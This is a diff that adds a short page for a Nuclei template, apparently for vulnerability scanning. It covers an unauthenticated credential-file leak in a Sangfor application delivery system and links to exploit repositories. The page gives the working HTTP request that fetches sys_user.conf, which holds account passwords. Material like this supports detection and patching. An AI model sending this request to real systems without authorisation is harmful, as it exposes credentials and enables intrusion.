@@ -1,0 +1,19 @@
+# Nuclei Template: Sangfor Application sys_user.conf Account Password Leakage
+**Template ID:** sangfor-sysuser-conf
+**Vulnerability Class:** Path Traversal
+**Severity:** High
+**Source:** Nuclei Template (`sangfor-sysuser-conf.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+Sangfor application delivery management system file sys_user.conf can be directly accessed without authorization, resulting in leakage of account and password
+
+## Steps to reproduce / Exploit Payload
+```http
+GET {{BaseURL}}/tmp/updateme/sinfor/ad/sys/sys_user.conf
+```
+
+## References
+- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20sys_user.conf%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
+- https://github.com/achuna33/MYExploit/blob/master/src/main/java/com/achuna33/Controllers/SangForController.java
